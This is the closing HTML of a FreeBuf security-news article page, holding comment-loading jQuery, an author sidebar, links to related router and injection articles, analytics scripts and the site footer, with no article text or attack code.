    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
        });
    });    
});
</script>            </div>
                    <div class="col-md-3 visible-md-block visible-lg-block">
                <div class="panel panel-default">
                    <div class="author-top">
                         <div class="author-wrap">
                            <div class="author-header"><img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-150x150.png" width="100" height="100" alt="" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo avatar-default" />                            </div>
                            <p class="name"><a href="http://www.freebuf.com/author/%e5%bd%b1%e6%ad%a6%e8%80%85%e5%ae%9e%e9%aa%8c%e5%ae%a4" title="由 影武者实验室 发布" rel="author">影武者实验室</a><span></span></p>
                            <p class="signature">此外，影武者实验室长期招猥琐的渗透测试，有经验的安全研究员，以及激灵的小鲜肉实习生。</p>
                            <p class="art-com clearfix">
                                <span class="aut-article">
                                    <a href="/author/影武者实验室"target="_blank">
                                        <i>2</i>
                                        <i>文章数</i>
                                    </a>
                                </span>
                                <span class="aut-comment">
                                    <a href="/author/影武者实验室?comment=1" target="_blank">
                                        <i>0</i>
                                        <i>评论数</i>
                                    </a>
                                </span>
                            </p>
                        </div>
                    </div>
                    <div class="author-bottom">
                        <div class="author-wrap">
                            <h3 class="last-title">最近文章</h3>
                            <div class="last-item-wrap">
                                                                        <div class="last-item">
                                            <a href="http://www.freebuf.com/vuls/126766.html" target="_blank"><span class="point"></span>TEW-654TR路由器漏洞分析和挖掘</a>
                                            <p class="last-time">2017.02.20</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/articles/terminal/124069.html" target="_blank"><span class="point"></span>对某路由器进行的渗透测试</a>
                                            <p class="last-time">2017.01.03</p>
                                        </div>
                                                                </div>
                        </div>

                        <div class="more-wrap">
                            <a href="http://www.freebuf.com/author/影武者实验室" target="_blank" class="btn-new">浏览更多</a>
                        </div>
                    </div>
                </div>
                                <div class="panel panel-default">
                    <div class="read visible-md-block visible-lg-block">
                        <div class="main-tit02">
                            <h3>相关阅读</h3>
                        </div>
                        <ul>
  <li><a href="http://www.freebuf.com/news/23158.html" target="_blank">路由器再度躺枪：主流厂商设备中被发现后门</a></li>
  
  <li><a href="http://www.freebuf.com/news/topnews/15678.html" target="_blank">[专题]近期路由器后门事件报告汇总[20131101UPDATE]</a></li>
  
  <li><a href="http://www.freebuf.com/articles/wireless/15641.html" target="_blank">NetGear路由器可以通过命令注入获取ROOT权限[附EXP]</a></li>
  
  <li><a href="http://www.freebuf.com/news/123391.html" target="_blank">DNSChanger卷土重来，家用路由器当心了</a></li>
  </ul><ul>
  <li><a href="http://www.freebuf.com/news/114665.html" target="_blank" title=可远程安装任意APP，小米手机藏后门？小米官方否认>可远程安装任意APP，小米手机藏后门？小米官方否认</a></li>
  </ul>                    </div>
                </div>
                <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
                <div class="panel panel-default rec-spe">
                    <div class="main-tit03 colour-blue">
                        <h3>特别推荐</h3>
                    </div>
                                                    <div class="rec-img"><a href="http://www.freebuf.com/ad?id=3" target="_blank"><img
                                            src="http://image.3001.net/2017/05/14a10c5c919d154dddbee79e3a944143-220x150.png" width="220"></a></div>
                                                </div>
                <div id="mar-right">
                    <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
                    <div class="panel panel-default code"><img src="http://image.3001.net/images/new/code.jpg" width="192"
                                                               height="192">
                        <p>关注我们 分享每日精选文章</p>
                    </div>
                </div>
            </div>
                </div>
                    <div class="row marvellous visible-lg-block">
                <h3>不容错过</h3>
                <ul>
                                                <li><a href="http://www.freebuf.com/sectool/53487.html" rel="bookmark"
                                   title="国产SQL注入漏洞测试工具 &#8211; 超级SQL注入工具（SSQLInjection）">国产SQL注入漏洞测试工具 &#8211; 超级SQL注入工具（SSQLInjection）</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/shack2" title="由 shack2 发布" rel="author">shack2</a></span>
                                                                        <span class="time">2014-12-04</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/108366.html" rel="bookmark"
                                   title="一家中国广告公司，如何利用恶意软件感染全球8500万台手机">一家中国广告公司，如何利用恶意软件感染全球8500万台手机</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/%e6%ac%a7%e9%98%b3%e6%b4%8b%e8%91%b1" title="由 欧阳洋葱 发布" rel="author">欧阳洋葱</a></span>
                                                                        <span class="time">2016-07-06</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/articles/network/126702.html" rel="bookmark"
                                   title="【新手指南】浅谈拒绝服务攻击的原理与防御（1）:普通拒绝服务攻击">【新手指南】浅谈拒绝服务攻击的原理与防御（1）:普通拒绝服务攻击</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/%e9%bb%91%e6%88%88%e7%88%be" title="由 黑戈爾 发布" rel="author">黑戈爾</a></span>
                                                                        <span class="time">2017-02-16</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/articles/terminal/99611.html" rel="bookmark"
                                   title="惊：黑客居然可以看到正在做“羞羞的事”的你！">惊：黑客居然可以看到正在做“羞羞的事”的你！</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/firefrank" title="由 FireFrank 发布" rel="author">FireFrank</a></span>
                                                                        <span class="time">2016-03-22</span></p>
                            </li>
                                                            </ul>
            </div>
            </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list ">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <ul>
      </ul>
    </div>
    <div class="footer-logo  pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2017 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1432444166" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
